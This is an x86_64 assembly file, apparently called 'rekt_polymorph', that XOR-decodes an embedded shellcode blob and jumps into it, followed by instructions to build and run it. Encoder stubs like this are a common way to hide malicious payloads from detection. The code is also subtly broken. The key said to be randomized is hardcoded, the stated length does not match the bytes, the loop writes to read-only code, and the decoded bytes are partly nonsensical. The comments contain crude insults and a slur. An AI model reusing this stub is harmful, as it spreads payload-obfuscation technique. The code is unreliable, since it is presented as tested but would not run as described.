; ------------------------------------------------------------
;  Tested on Linux x86_64, compiled by a sleep-deprived goblin
; ------------------------------------------------------------

global _start
section .text

_start:
    ; load RSI with the location of our cursed payload
    ; imagine a pointer... but it's seen some shit
    lea rsi, [rel encoded_shellcode]

    ; RCX = shellcode length
    ; Yes it's hardcoded, because fuck abstraction
    mov rcx, 54

    ; XOR key — randomized at runtime
    mov al, 0xA7

    ; =========================
    ; ? this loop is so jank ?
    ; =========================
decode_loop:
    ; classic XOR decrypt: because AES is for cowards
    ; if you don’t understand this, you’re probably a frontend dev
    xor byte [rsi], al
    inc rsi
    loop decode_loop

    ; execute decoded shellcode
    ; welcome to clown world, cuckboy
    jmp encoded_shellcode

; -----------------------------------------
; ?? ENCODED SHELLCODE BELOW THIS POINT ??
; These bytes are more obfuscated than my gender on government forms
; -----------------------------------------

encoded_shellcode:
    db 0xEF,0x96,0x67,0xEF,0x2E,0x6A,0xEF,0x20,0x9A,0xA9,0xA7,0xA7,0xA7
    db 0x1F,0xAA,0xA7,0xA7,0xA7,0x1E,0xA6,0xA7,0xA7,0xA7,0x14,0xA6,0xA7
    db 0xA7,0xA7,0xA5,0xA2,0x1E,0x9B,0xA7,0xA7,0xA7,0x96,0x58,0xA5,0xA2
    db 0xE0,0xE2,0xF3,0x87,0xF9,0xE2,0xED,0xF3,0x87,0xE3,0xE4,0xE8,0xE6,0xAD

; ------------------------------------------------------------
; ?? Build Instructions:
; nasm -f elf64 rekt_polymorph.asm -o rekt.o
; ld rekt.o -o rekt
; ./rekt
; If you get segfaults, it's not a bug — it's a feature
; ------------------------------------------------------------
